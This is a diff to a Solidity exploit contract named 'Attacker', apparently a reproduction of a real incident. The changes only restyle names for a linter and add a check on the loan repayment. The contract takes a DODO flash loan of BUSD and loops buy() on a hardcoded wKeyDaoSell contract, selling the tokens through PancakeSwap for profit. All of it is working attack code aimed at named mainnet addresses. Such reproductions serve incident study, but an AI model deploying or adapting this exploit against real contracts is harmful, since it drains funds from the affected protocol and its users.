@@ -8,21 +8,21 @@ import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Rec
 import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 // Contracts involved
-address constant wKeyDaoSell = 0xD511096a73292A7419a94354d4C1C73e8a3CD851;
+address constant W_KEY_DAO_SELL = 0xD511096a73292A7419a94354d4C1C73e8a3CD851;
 address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
-address constant wKeyDAO = 0x194B302a4b0a79795Fb68E2ADf1B8c9eC5ff8d1F;
-address constant pancakeSwapRouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+address constant W_KEY_DAO = 0x194B302a4b0a79795Fb68E2ADf1B8c9eC5ff8d1F;
+address constant PANCAKE_SWAP_ROUTER_V2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
 
 contract Attacker {
     function fire() external {
-        __dodoFlashLoan(address(0x107F3Be24e3761A91322AA4f5F54D9f18981530C), 1200e18, BUSD);
+        _dodoFlashLoan(address(0x107F3Be24e3761A91322AA4f5F54D9f18981530C), 1200e18, BUSD);
     }
 
     function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
         return IERC721Receiver.onERC721Received.selector;
     }
 
-    function __dodoFlashLoan(
+    function _dodoFlashLoan(
         address flashLoanPool, //You will make a flashloan from this DODOV2 pool
         uint256 loanAmount,
         address loanToken
@@ -41,6 +41,7 @@ contract Attacker {
     }
 
     //Note: CallBack function executed by DODOV2(DVM) flashLoan pool
+    // forge-lint: disable-next-item(mixed-case-function)
     function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         _flashLoanCallBack(sender, baseAmount, quoteAmount, data);
     }
@@ -50,31 +51,32 @@ contract Attacker {
 
         require(sender == address(this) && msg.sender == flashLoanPool, "HANDLE_FLASH_NENIED");
 
-        __realAttack();
+        _realAttack();
 
         //Return funds
-        IERC20(loanToken).transfer(flashLoanPool, loanAmount);
+        require(IERC20(loanToken).transfer(flashLoanPool, loanAmount), "transfer failed");
     }
 
-    function __realAttack() internal {
-        //approve BUSD to wKeyDaoSell
-        IERC20(BUSD).approve(wKeyDaoSell, 1_000_000e18);
+    function _realAttack() internal {
+        //approve BUSD to W_KEY_DAO_SELL
+        IERC20(BUSD).approve(W_KEY_DAO_SELL, 1_000_000e18);
 
-        //approve wKeyDAO to pancakeSwapRouterV2
-        IERC20(wKeyDAO).approve(pancakeSwapRouterV2, 10_000_000_000_000_000_000_000_000_000_000);
+        //approve W_KEY_DAO to PANCAKE_SWAP_ROUTER_V2
+        IERC20(W_KEY_DAO).approve(PANCAKE_SWAP_ROUTER_V2, 10_000_000_000_000_000_000_000_000_000_000);
 
         // to save time, we loop 5 times. -- can buy 67 times in total
         for (uint256 i = 0; i < 5; i++) {
             //buy
-            IwKeyDaoSell(wKeyDaoSell).buy();
+            IwKeyDaoSell(W_KEY_DAO_SELL).buy();
 
-            //sell wKeyDAO
+            //sell W_KEY_DAO
             address[] memory path = new address[](2);
-            path[0] = address(wKeyDAO);
+            path[0] = address(W_KEY_DAO);
             path[1] = address(BUSD);
-            IPancakeRouter02(pancakeSwapRouterV2).swapExactTokensForTokensSupportingFeeOnTransferTokens(
-                IERC20(wKeyDAO).balanceOf(address(this)), 0, path, address(this), block.timestamp
-            );
+            IPancakeRouter02(PANCAKE_SWAP_ROUTER_V2)
+                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
+                    IERC20(W_KEY_DAO).balanceOf(address(this)), 0, path, address(this), block.timestamp
+                );
         }
     }
 }
